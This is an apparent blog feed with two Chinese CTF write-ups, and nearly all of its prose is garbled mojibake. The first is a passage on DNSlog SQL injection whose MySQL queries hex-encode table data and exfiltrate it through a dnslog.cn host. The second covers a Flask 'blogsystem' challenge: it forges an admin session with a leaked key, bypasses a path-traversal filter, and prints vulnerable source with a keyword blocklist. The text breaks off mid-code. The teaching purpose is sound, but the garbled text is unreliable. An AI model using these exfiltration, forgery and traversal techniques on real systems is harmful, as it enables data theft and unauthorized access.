href="#æŸ¥çœ‹æ•°æ®" class="headerlink" title="æŸ¥çœ‹æ•°æ®"></a>æŸ¥çœ‹æ•°æ®</h3><p>å½“æˆ‘ä½¿ç”¨ä¸‹é¢è¯­å¥<code> select load_file(concat(&#39;//&#39;,(select group_concat(id,user,name separator  &#39;.&#39;)from table1),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code>æŸ¥è¯¢æ•°æ®å°±ä¼šå¤±æ•ˆï¼Œå› ä¸º<br>urlä¸­ä¼ é€’çš„å­—ç¬¦éå¸¸æœ‰é™ï¼Œå¾ˆå¤šç‰¹æ®Šå­—ç¬¦å¦‚ <code>&#123; , &#125; , ï¼</code>,æ˜¯æ— æ³•ä¼ é€’çš„ï¼Œè¿™å°±ä¼šå¯¼è‡´æˆ‘ä»¬çš„load_fileå‡½æ•°å¤±æ•ˆï¼Œè€Œåœ¨flagä¸­æ‹¬å·ä»€ä¹ˆçš„ä¼šç»å¸¸å‡ºç°ï¼Œæ‰€ä»¥ä½¿ç”¨hexè¿›è¡Œç¼–ç <br><code>select load_file(concat(&#39;//&#39;,(select hex(group_concat(id,user,name separator  &#39;.&#39;)) from table1),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/pSSptQU.png" alt="pSSptQU.png"><br>å¾—åˆ°<br><img src="https://s1.ax1x.com/2022/12/28/zzxuL9.png" alt="zzxuL9.png"><br>ç„¶åè§£ç å¾—åˆ°å­—æ®µæ•°æ®<br><img src="https://s1.ax1x.com/2022/12/28/zzxtQe.png" alt="zzxtQe.png"></p><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/monster663/article/details/113757235">æ·±åº¦å‰–æDNSLogæ³¨å…¥åŸç†&amp;æœ¬åœ°å®ä¾‹æµ‹è¯•_monster663çš„åšå®¢-CSDNåšå®¢_dnslogæ³¨å…¥åŸç†</a><br><a href="https://blog.csdn.net/king9666/article/details/106022050">DNSåŸç†åŠå…¶è§£æè¿‡ç¨‹_king9666çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://www.freebuf.com/articles/web/259023.html">DNSlogæ³¨å…¥è¯¦ç»†è§£æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>buuåæœˆèµ› blogsystem</title>
      <link href="/undefined/17771.html"/>
      <url>/undefined/17771.html</url>
      
        <content type="html"><![CDATA[<p><strong>é¦–å…ˆå¾—æ„Ÿè°¢<a href="https://www.lengf233.top/">lengf</a>å¸ˆå‚…ç»™è§£ç­”ä¸€äº›å¾ˆå‚»çš„é—®é¢˜</strong></p><p>è¿™ä¸ªé¢˜åé¢æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ä¹‹å‰è¿˜æ²¡å­¦è¿‡ï¼Œå…ˆçœ‹çœ‹å§<br>è¿›å…¥é¢˜ç›®æ³¨å†Œä¸€ä¸ªè´¦å·å‘ç°adminå·²ç»è¢«æ³¨å†Œï¼Œè¿™é‡Œå°±è¦æƒ³åˆ°sessionä¼ªé€ ï¼Œä»¥adminç™»å½•<br>è¦ä¼ªé€ sessionå°±å¾—çŸ¥é“keyï¼Œåœ¨Blogè·¯ç”±çš„<code>flask åŸºç¡€æ€»ç»“</code>è¿™ç¯‡æ–‡ç« æ‰¾åˆ°key<br><img src="https://s1.ax1x.com/2022/12/27/zzBSnx.png" alt="zzBSnx.png"><br>ç„¶åç”¨å·¥å…·ä¼ªé€ <br><code>python flask_session_cookie_manager3.py encode -s 7his_1s_my_fav0rite_ke7 -t &quot;&#123;&#39;_permanent&#39;:True,&#39;username&#39;:&#39;admin&#39;&#125;&quot;</code><br>ä»¥adminç™»å½•ä¼šå‘ç°å¤šäº†ä¸€ä¸ªDownloadè·¯ç”±<br><img src="https://s1.ax1x.com/2022/12/27/zzBpB6.png" alt="zzBpB6.png"><br>ç‚¹è¿›å…¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒæŠ“åŒ…ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œè¿™é‡Œæ˜¯ç”¨<code>.//./</code>ç»•è¿‡ï¼Œæºç è¿‡æ»¤æ–¹å¼ä¸º<code>.replace(&#39;..&#39;, &#39;&#39;).replace(&#39;//&#39;, &#39;&#39;)</code><br><img src="https://s1.ax1x.com/2022/12/27/zzB9HK.png" alt="zzB9HK.png"><br>æºç åœ¨app&#x2F;app.py<br><img src="https://s1.ax1x.com/2022/12/27/zzBiND.png" alt="zzBiND.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">//app.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> config  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">app.config.from_object(config)  </span><br><span class="line">app.secret_key = <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span>  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> view <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">app.register_blueprint(index, name=<span class="string">&#x27;index&#x27;</span>)  </span><br><span class="line">app.register_blueprint(blog, name=<span class="string">&#x27;blog&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.context_processor  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_statue</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> username:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">            <span class="keyword">if</span> user:  </span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&#x27;name&#x27;</span>: user.name, <span class="string">&#x27;password&#x27;</span>: user.password&#125;  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> e  </span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¯¼å…¥æ¨¡å—åˆ¤æ–­æ˜¯MVTæ¶æ„ï¼Œæœç´¢ä¸€æ³¢</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp myweb</span><br><span class="line"></span><br><span class="line">è¿™å°†åˆ›å»ºä¸€ä¸ªç›®å½•mywebï¼Œå…¶ç›®å½•å¦‚ä¸‹ï¼šæ­¤ç›®å½•ç»“æ„å°†å®¹çº³è½®è¯¢åº”ç”¨ç¨‹åºã€‚</span><br><span class="line"></span><br><span class="line">[<span class="meta">root@localhost demo</span>]<span class="meta"># tree mysite/</span></span><br><span class="line">mysite/</span><br><span class="line">â”œâ”€â”€ manage.py</span><br><span class="line">â”œâ”€â”€ mysite</span><br><span class="line">â”‚   â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚   â”œâ”€â”€ settings.py</span><br><span class="line">â”‚   â”œâ”€â”€ urls.py</span><br><span class="line">â”‚   â””â”€â”€ wsgi.py</span><br><span class="line">â””â”€â”€ myweb</span><br><span class="line">    â”œâ”€â”€ admin.py</span><br><span class="line">    â”œâ”€â”€ apps.py</span><br><span class="line">    â”œâ”€â”€ __init__.py</span><br><span class="line">    â”œâ”€â”€ migrations</span><br><span class="line">    â”‚   â””â”€â”€ __init__.py</span><br><span class="line">    â”œâ”€â”€ models.py</span><br><span class="line">    â”œâ”€â”€ tests.py</span><br><span class="line">    â””â”€â”€ views.py</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶ç»“æ„ï¼Œç„¶åè¯»å–<code>view/__init__.py</code>å‘ç°åœ¨å…¶ä¸­åˆå¯¼å…¥äº†å…¶ä»–æ¨¡å—<br><img src="https://s1.ax1x.com/2022/12/27/zzBPAO.png" alt="zzBPAO.png"><br>æ¥ç€è¯»å–index.pyå’Œblog.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">//index.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, session, render_template, request, flash, redirect, url_for, Response, send_file  </span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> check_password_hash  </span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line">index = Blueprint(<span class="string">&quot;index&quot;</span>, __name__)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)  </span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  </span><br><span class="line">            flash(<span class="string">&quot;è¯¥ç”¨æˆ·åå·²å­˜åœ¨&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            user = User(username=username, name=name)  </span><br><span class="line">            user.password_hash(password)  </span><br><span class="line">            db.session.add(user)  </span><br><span class="line">            db.session.commit()  </span><br><span class="line">            flash(<span class="string">&quot;æ³¨å†ŒæˆåŠŸï¼&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> (user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>) <span class="keyword">and</span> (check_password_hash(user.password, password)):  </span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username  </span><br><span class="line">            session.permanent = <span class="literal">True</span>  </span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            flash(<span class="string">&quot;è´¦å·æˆ–å¯†ç é”™è¯¯&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&quot;/updatePwd&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        lodPwd = request.form.get(<span class="string">&quot;lodPwd&quot;</span>)  </span><br><span class="line">        newPwd1 = request.form.get(<span class="string">&quot;newPwd1&quot;</span>)  </span><br><span class="line">        newPwd2 = request.form.get(<span class="string">&quot;newPwd2&quot;</span>)  </span><br><span class="line">        username = session.get(<span class="string">&quot;username&quot;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> check_password_hash(user.password, lodPwd):  </span><br><span class="line">            <span class="keyword">if</span> newPwd1 != newPwd2:  </span><br><span class="line">                flash(<span class="string">&quot;ä¸¤æ¬¡æ–°å¯†ç ä¸ä¸€è‡´ï¼&quot;</span>)  </span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                user.password_hash(newPwd2)  </span><br><span class="line">                db.session.commit()  </span><br><span class="line">                flash(<span class="string">&quot;ä¿®æ”¹æˆåŠŸï¼&quot;</span>)  </span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            flash(<span class="string">&quot;åŸå¯†ç é”™è¯¯ï¼&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        path = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        path = os.path.join(<span class="string">&#x27;static/upload/&#x27;</span>, path)  </span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path):  </span><br><span class="line">            <span class="keyword">return</span> send_file(path)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>, file=path)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>,  </span><br><span class="line">                           yaml=<span class="string">&#x27;æ‰€è°“ã€æ¶ã€ï¼Œæ˜¯é‚£äº›åªä¸ºäº†è‡ªå·±ï¼Œåˆ©ç”¨å’Œè·µè¸å¼±è€…çš„å®¶ä¼™ï¼ä½†æ˜¯ï¼Œæˆ‘è™½ç„¶æ˜¯è¿™æ ·ï¼Œä¹ŸçŸ¥é“ä»€ä¹ˆæ˜¯ä»¤äººä½œå‘•çš„ã€æ¶ã€ï¼Œæ‰€ä»¥ï¼Œç”±æˆ‘æ¥åˆ¶è£ï¼&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():  </span><br><span class="line">    session.clear()  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">//blog.py</span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, render_template, request, session  </span><br><span class="line"><span class="keyword">from</span> yaml <span class="keyword">import</span> Loader  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">blog = Blueprint(<span class="string">&quot;blog&quot;</span>, __name__, url_prefix=<span class="string">&quot;/blog&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):  </span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/writeBlog&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeblog</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;writeBlog.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)  </span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)  </span><br><span class="line">        username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        create_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        blog = Blog(title=title, text=text, create_time=create_time, user_id=user.<span class="built_in">id</span>)  </span><br><span class="line">        db.session.add(blog)  </span><br><span class="line">        db.session.commit()  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.create_time == create_time).first()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=blog.<span class="built_in">id</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)  </span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)  </span><br><span class="line">        file.save(filePath)  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>,  </span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/showBlog/&lt;id&gt;&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showBlog</span>(<span class="params"><span 